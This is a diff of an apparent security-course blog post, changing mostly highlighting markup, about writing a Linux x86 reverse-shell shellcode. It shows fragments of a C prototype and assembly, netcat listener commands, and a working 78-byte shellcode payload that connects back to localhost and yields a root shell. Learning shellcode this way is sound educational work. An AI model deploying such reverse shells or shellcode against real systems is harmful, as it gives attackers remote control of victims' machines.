@@ -68,10 +68,10 @@
             <p>I remember when I was first introduced to the concept of the reverse shell it was a bit difficult to wrap my mind around it. The reverse shell is called so because instead of attacker connecting to the victim machine, the victim machine initiates a connection to the attacking machine. The shell-throwing direction is reversed in this case. Reverse shell's main purpose is to circumvent firewalls that blindly allow outgoing traffic without proper filtering. </p>
 <p>It turned out that the code for the reverse shell is actually simpler than that of the <a href="/blog/building-tcp-bind-shell-shellcode/">bind TCP shell</a> I wrote about in a previous post. It is also shorter. </p>
 <p>Here is the prototype C program that we will base our Assembly code on. Code is pretty simple, but nevertheless I furnished it with comments:</p>
-<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;strings.h&gt;</span>
-<span class="cp">#include &lt;sys/socket.h&gt;</span>
-<span class="cp">#include &lt;netinet/in.h&gt;</span>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;strings.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp"></span>
 
 <span class="cp">#define ADDR &quot;127.0.0.1&quot;</span>
 <span class="cp">#define PORT 1234</span>
@@ -102,24 +102,24 @@
 
 
 <p>After compilation we can use Netcat to test that the code is working:</p>
-<div class="highlight"><pre><span class="c"># Start Netcat in one console window</span>
-nc -lvp 1234
+<div class="highlight"><pre><span></span><span class="c1"># Start Netcat in one console window</span>
+nc -lvp <span class="m">1234</span>
 
-<span class="c"># Compile and start the C reverse shell implementation</span>
+<span class="c1"># Compile and start the C reverse shell implementation</span>
 gcc -o revshell revshell.c <span class="o">&amp;&amp;</span> ./revshell
 
-<span class="c"># Back in the console with Netcat you should get a connection. Test if it works:</span>
+<span class="c1"># Back in the console with Netcat you should get a connection. Test if it works:</span>
 listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
-connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from localhost <span class="o">[</span>127.0.0.1<span class="o">]</span> 35476
+connect to <span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span> from localhost <span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span> <span class="m">35476</span>
 id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
 ^C
 </pre></div>
 
 
 <p>One thing to remember from the previous post on bind TCP shell is that <code>socket</code> and <code>connect</code> functions are plugged into the <code>socketcall</code> system call. And basically we can largely reuse the bind shell source code making relevant changes to it. The changes include removing blocks for listen and accept functions, transforming bind function block to connect, and replacing the address from 0.0.0.0 to 127.1.1.1. The 127.1.1.1 is equivalent to 127.0.0.1 localhost address, with an advantage of eliminating zeroes. Some people think that only 127.0.0.1 address refers to the localhost, while in truth all valid IPv4 address beginning with 127 are synonyms and refer to the same localhost address. </p>
 <p>After applying the aforementioned changes, here is what I got (follow the comments if it is not clear what's going on):</p>
-<div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
+<div class="highlight"><pre><span></span><span class="k">section</span> <span class="nv">.text</span>
     <span class="k">global</span> <span class="nv">_start</span>
 
 <span class="nl">_start:</span>
@@ -184,14 +184,14 @@ id
 
 
 <p>Now let's build the binary and extract and thest the shellcode to make sure that we have not missed anything. </p>
-<div class="highlight"><pre><span class="c"># Build a binary and extract the shellcode </span>
+<div class="highlight"><pre><span></span><span class="c1"># Build a binary and extract the shellcode </span>
 nasm -f elf revshell.asm <span class="o">&amp;&amp;</span> ld -o revshell revshell.o
 scdump revshell
 </pre></div>
 
 
 <p>Output of the above command (formatted to fit the screen):</p>
-<div class="highlight"><pre>Length:  78
+<div class="highlight"><pre><span></span>Length:  78
 Payload: &quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80&quot;
 &quot;\x92\xb0\x66\x5b\x5e\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x66\x53\x6a\x10\x51&quot;
 &quot;\x52\x89\xe1\x43\xcd\x80\x87\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9&quot;
@@ -202,21 +202,21 @@ Payload: &quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\
 
 <div class="divider"></div>
 
-<div class="highlight"><pre><span class="c"># Paste the shellcode into the scframe.c and compile it:</span>
+<div class="highlight"><pre><span></span><span class="c1"># Paste the shellcode into the scframe.c and compile it:</span>
 gcc -fno-stack-protector -z execstack -o scframe scframe.c
 
-<span class="c"># In another console window start Netcat listener</span>
-nc -lvp 1234
+<span class="c1"># In another console window start Netcat listener</span>
+nc -lvp <span class="m">1234</span>
 
-<span class="c"># Back in the window where you compiled the scframe launch it</span>
+<span class="c1"># Back in the window where you compiled the scframe launch it</span>
 ./scframe
 
-<span class="c"># Check the Netcat listener to see if you got a reverse shell connection</span>
-nc -lvp 1234
+<span class="c1"># Check the Netcat listener to see if you got a reverse shell connection</span>
+nc -lvp <span class="m">1234</span>
 listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
-connect to <span class="o">[</span>127.1.1.1<span class="o">]</span> from localhost <span class="o">[</span>127.0.0.1<span class="o">]</span> 33275
+connect to <span class="o">[</span><span class="m">127</span>.1.1.1<span class="o">]</span> from localhost <span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span> <span class="m">33275</span>
 id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
 ^C
 </pre></div>
 
@@ -277,7 +277,7 @@ This blog post was created to fulfill the requirements of the <a href="http://se
     </ul>
 
     <p class="disclaimer">
-    Oleg Mitrofanov &copy; 2015-2016.
+    Oleg Mitrofanov &copy; 2015-2017.
     Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
     </p>
 </footer>
